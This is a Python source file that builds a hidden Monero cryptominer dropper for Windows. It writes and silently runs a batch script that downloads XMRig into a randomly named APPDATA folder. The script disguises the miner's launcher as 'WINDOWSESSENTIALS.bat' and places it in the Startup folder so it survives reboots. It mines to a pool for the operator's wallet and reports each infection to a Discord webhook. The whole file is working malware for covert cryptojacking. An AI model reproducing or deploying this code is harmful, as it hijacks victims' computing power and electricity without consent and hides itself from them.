import os
import subprocess
import requests
import random
import string
import sys
import base64

def get_random_string(length=12):
    """Generate a random string of specified length."""
    characters = string.ascii_letters + string.digits  # Letters (uppercase + lowercase) and digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def send_on_notification(xmr_address, webhook_url, miner_id):
    """Send a notification to the Discord webhook."""
    message = {
        "embeds": [
            {
                "author": {
                    "name": f"Miner {miner_id} has started running",
                    "icon_url": "https://cdn.discordapp.com/avatars/1282714893702922302/fd64a132d6ef8b8aa63d68063e3c495c?size=1024"
                },
                "description": f"XMR:\n```{xmr_address}```\nWebhook:\n```{webhook_url}```",
                "footer": {
                    "text": "made by notauthorised | https://github.com/notauthorisedxd/XMR-MINER"
                },
                "color": 52084
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=message)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send Discord notification: {e}", file=sys.stderr)

def send_off_notification(xmr_address, webhook_url, miner_id):
    """Send a notification to the Discord webhook."""
    message = {
        "embeds": [
            {
                "author": {
                    "name": f"Miner {miner_id} has stopped running",
                    "icon_url": "https://cdn.discordapp.com/avatars/1282714893702922302/fd64a132d6ef8b8aa63d68063e3c495c?size=1024"
                },
                "description": f"XMR:\n```{xmr_address}```\nWebhook:\n```{webhook_url}```",
                "footer": {
                    "text": "made by notauthorised | https://github.com/notauthorisedxd/XMR-MINER"
                },
                "color": 15879747
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=message)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send Discord notification: {e}", file=sys.stderr)

def xmrig():
    
    xmr_address = base64.b64decode("%%XMRADDRESS%%")
    webhook_url = base64.b64decode("%%WEBHOOK_URL%%")


    miner_id = get_random_string(12)

    # Batch script template
    batch_code = f"""
@echo off

set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip

REM Generating a random directory name for installation
set "INSTALL_DIR=%APPDATA%\\WINDOWSDUMP\\%RANDOM%\\%RANDOM%"

mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

powershell -command "& {{Invoke-WebRequest '%XMRIG_URL%' -OutFile 'xmrig.zip'}}"

powershell -command "& {{Expand-Archive -Path '.\\xmrig.zip' -DestinationPath '.'}}"

cd xmrig-6.21.0

REM Generate the start script
echo @echo off > WINDOWSESSENTIALS.bat
echo cd /d "%INSTALL_DIR%\\xmrig-6.21.0" >> WINDOWSESSENTIALS.bat
echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u {xmr_address} -p {miner_id} -a rx/0 -k --background >> WINDOWSESSENTIALS.bat

REM Move start script to the Startup folder
echo move /y "WINDOWSESSENTIALS.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" > move_to_startup.bat
call move_to_startup.bat
del move_to_startup.bat

REM Call the start script from Startup folder
cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
call WINDOWSESSENTIALS.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
    """

    # Add the webhook notification part if a webhook is provided
    if webhook_url:
        send_on_notification(xmr_address, webhook_url, miner_id)

    # Save the batch script to a temporary file
    batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")

    with open(batch_filepath, "w") as f:
        f.write(batch_code)

    # Create subprocess to execute the batch file
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    process = subprocess.Popen(
        ["cmd.exe", "/c", batch_filepath],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        startupinfo=startupinfo,
    )

    stdout, stderr = process.communicate()

    if stderr:
        print(stderr.decode(), file=sys.stderr)

    # Send Discord notification if the webhook is provided
    if webhook_url:
        send_off_notification(xmr_address, webhook_url, miner_id)


xmrig()